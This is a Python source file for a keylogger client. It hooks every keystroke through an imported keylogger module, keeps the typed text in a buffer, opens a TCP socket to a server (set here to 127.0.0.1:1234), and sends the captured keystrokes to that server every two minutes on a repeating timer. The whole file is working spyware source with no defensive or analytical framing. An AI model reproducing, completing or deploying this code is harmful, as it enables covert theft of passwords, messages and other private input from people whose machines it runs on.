import keylogger
import threading
import socket
import logging

'''
    This class is used to start the keylogger client and 
    send data captured in client computers to server in every
    2 minutes interval
'''


class KeyloggerClient(object):

    def __init__(self):
        print('Keylogger Client')
        self.logger = ''
        self.client = object()

    '''
        Callback mthod which is called every time a keyboard key is pressed
    '''

    def keyboard_event(self, event):
        self.logger = self.logger + event.key

    '''
        Method to send keystrokes and data captured from client
        to server in every 2 minutes
    '''

    def send_log_to_server(self):
        # running this function every 2 min to send data to server
        threading.Timer(120.0, self.send_log_to_server).start()
        self.client.send(self.logger.encode())
        logging.debug('send data to server')
        logging.debug('data: ', self.logger)

    '''
        Method to make a TCP connection to server
        AF_INET: use standard IPv4 addressing
        SOCK_STREAM: indicates this is the TCP client
    '''

    def connect_to_server(self, server_address, port):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.client.connect((server_address, port))
            return True
        except Exception as e:
            logging.exception(e)
            return False

    '''
        Utility method to start the keylogger client
    '''

    def start(self, server_address, port):
        is_connected = self.connect_to_server(server_address, port)
        key_logger = keylogger.Keylogger()
        key_logger.logger = self.keyboard_event
        if is_connected:
            self.send_log_to_server()
        key_logger.start()


def main():
    key_logger_client = KeyloggerClient()
    key_logger_client.start('127.0.0.1', 1234)


if __name__ == '__main__':
    main()
